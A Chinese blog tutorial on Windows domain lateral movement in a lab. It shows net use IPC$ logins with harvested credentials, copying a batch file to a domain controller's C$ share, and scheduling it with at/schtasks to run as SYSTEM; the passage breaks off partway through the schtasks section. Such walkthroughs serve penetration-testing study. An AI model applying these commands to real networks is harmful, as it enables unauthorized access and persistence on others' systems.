{"title":"内网安全-域横向渗透【一】","uid":"fd6e852f2bcb63bb7a3b0ef31dd46aab","slug":"内网安全-域横向渗透【一】","date":"2022-06-27T00:59:07.000Z","updated":"2022-06-27T14:44:49.944Z","comments":true,"path":"api/articles/内网安全-域横向渗透【一】.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><h2 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h2><p>脑图：<br><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F-%E5%9F%9F%E7%8E%AF%E5%A2%83.png\" alt=\"横向渗透-域环境\"></p>\n<h2 id=\"0x01-明文传递-at-amp-schtasks\"><a href=\"#0x01-明文传递-at-amp-schtasks\" class=\"headerlink\" title=\"0x01 明文传递 at&amp;schtasks\"></a>0x01 明文传递 at&amp;schtasks</h2><p>###0x00 思路及流程</p>\n<p>1、在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，可以横向渗透拿下更多的主机在已知目标系统的用户明文密码的基础上， 使用at&amp;schtasks 命令，直接可以在远程主机上执行命令。</p>\n<p>2、获取到某域主机权限-&gt;minikatz 得到密码（明文，hash）-&gt;用到信息收集里面域用户的列表当做用户名字典-&gt;用到密码明文当做密码字典-&gt;尝试连接-&gt;创建计划任务(at|schtasks)-&gt;执行文件可为后门或者相关命令</p>\n<h3 id=\"0x01-利用流程\"><a href=\"#0x01-利用流程\" class=\"headerlink\" title=\"0x01 利用流程\"></a>0x01 利用流程</h3><p>1、建立 IPC 链接到目标主机</p>\n<p>2、拷贝要执行的命令脚本到目标主机</p>\n<p>3、查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本</p>\n<p>4、删除 IPC 链接</p>\n<h3 id=\"0x02-IPC\"><a href=\"#0x02-IPC\" class=\"headerlink\" title=\"0x02 IPC\"></a>0x02 IPC</h3><p>1、介绍：</p>\n<p> IPC（Internet Process Connection）是共享“命名管道”，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相关的权限，在远程管路计算机和查看计算机的共享资源时使用。</p>\n<p>2、建立 IPC 常见的错误代码</p>\n<p>（1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限</p>\n<p>（2）51：网络问题，Windows 无法找到网络路径</p>\n<p>（3）53：找不到网络路径，可能是 IP 地址错误、目标未开机、目标 Lanmanserver 服务未启动、有防火墙等问题</p>\n<p>（4）67：找不到网络名，本地 Lanmanworkstation 服务未启动，目标删除 ipc$</p>\n<p>（5）1219：提供的凭据和已存在的凭据集冲突，说明已建立 IPC$，需要先删除</p>\n<p>（6）1326：账号密码错误</p>\n<p>（7）1792：目标 NetLogon 服务未启动，连接域控常常会出现此情况</p>\n<p>（8）2242：用户密码过期，目标有账号策略，强制定期更改密码</p>\n<p>3、建立 IPC 失败的原因</p>\n<p>（1）目标系统不是 NT 或2003以上的操作系统</p>\n<p>（2）对方没有打开 IPC$共享</p>\n<p>（3）对方未开启 139、445 端口，或者被防火墙屏蔽（139、445默认开启）</p>\n<p>（4）输出命令、账号密码有错误</p>\n<h3 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>[at] &amp; [schtasks]命令：<br>at &lt; Windows2012（at适用于2012之前的版本）</p>\n<p>schtasks&gt;&#x3D;Windows2012（schtasks适用于2012之后的版本）</p></blockquote>\n<p><strong>1、使用at</strong></p>\n<p>首先定位一个域控主机的IP地址：<br><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/image-20220627094217518.png\" alt=\"image-20220627094217518\"></p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/image-20220627094309839.png\" alt=\"image-20220627094309839\"></p>\n<p>得到域控主机IP：192.168.3.21 </p>\n<p>查找所在域，出错了：</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/image-20220627100705230.png\" alt=\"image-20220627100705230\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>解决方法：</p>\n<p>如果开了防火墙的话也是不可以执行的，先关闭防火墙。再检查以下。</p>\n<p>1.win+R ,输入services.msc 开启服务：Server ，WorkStation，computer Browser</p>\n<p>2.如果你的电脑没有computer Browser服务，win+R 输入appwiz.cpl ,选择启用或关闭Windows功能，选择SMB1.0&#x2F;CIFS 文件共享支持，重启电脑。然后开启以上3个服务。</p>\n<p>3.重启computer Browser服务即可。</p></blockquote>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/image-20220627100815111.png\" alt=\"image-20220627100815111\"></p>\n<p>假设知道域控的ip地址和密码（通过minikatz获取明文、哈希密码）</p>\n<p>通过密码和ip地址连接域控主机</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>相关连接域控命令（使用ipc:命名管道）</p>\n<p><code>net use \\\\server\\ipc$&quot;password&quot; /user:username # 工作组</code></p>\n<p><code>net use \\\\server\\ipc$&quot;password&quot; /user:domain\\username #域内</code></p></blockquote>\n<p><strong>（连接之前需要扫描端口139，445是否开启）</strong></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>使用命令：</p>\n<p><code>net use \\\\192.168.3.21\\ipc$ &quot;Hacker123&quot; /user:test\\administrator</code></p></blockquote>\n<p>使用ipc连接之后会出现已经连接到DC主机：</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/image-20220627194504347.png\" alt=\"image-20220627194504347\"></p>\n<p>之后在本地（webserver）c盘创建可执行文件，添加一个用户：</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/image-20220627195816561.png\" alt=\"image-20220627195816561\"></p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/image-20220627195033563.png\" alt=\"image-20220627195033563\"></p>\n<p>拷贝执行文件（本地c盘add.bat）到目标机器（在实战中一般都是类似msf的后门）</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><code>copy add.bat \\\\192.168.3.21\\c$</code></p></blockquote>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/image-20220627195132462.png\" alt=\"image-20220627195132462\"></p>\n<p>在域控主机DC可发现文件：</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/image-20220627195205628.png\" alt=\"image-20220627195205628\"></p>\n<p>最后添加计划任务（类似于Linux计划任务提权，这里的计划任务是以system执行的，是计算机的最高权限）</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>执行命令：</p>\n<p><code>at \\\\192.168.3.21 19:56 c:\\add.bat</code></p></blockquote>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/image-20220627195329452.png\" alt=\"image-20220627195329452\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>执行命令：</p>\n<p><code>net user</code></p></blockquote>\n<p>在域控主机DC查看用户test是否被成功创建：</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/image-20220627200843816.png\" alt=\"image-20220627200843816\"></p>\n<p>2、<strong>使用schtasks</strong>（操作系统&gt;&#x3D;2012）</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>建立ipc连接：<br><code>net use \\\\192.168.3.32\\ipc$ &quot;password&quot; /user:domain\\administrator</code></p>\n<p><code>net use \\\\192.168.3.32\\ipc$ &quot;Hacker123&quot; /user:test\\administrator</code></p></blockquote>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91.htm/image-20220627202648827.png\" alt=\"image-20220627202648827\"></p>\n<p>复制文件到其 C 盘（如果拒绝访问，原因：域用户不能对本地Server 2012 SqlServer服务器进行操作）</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 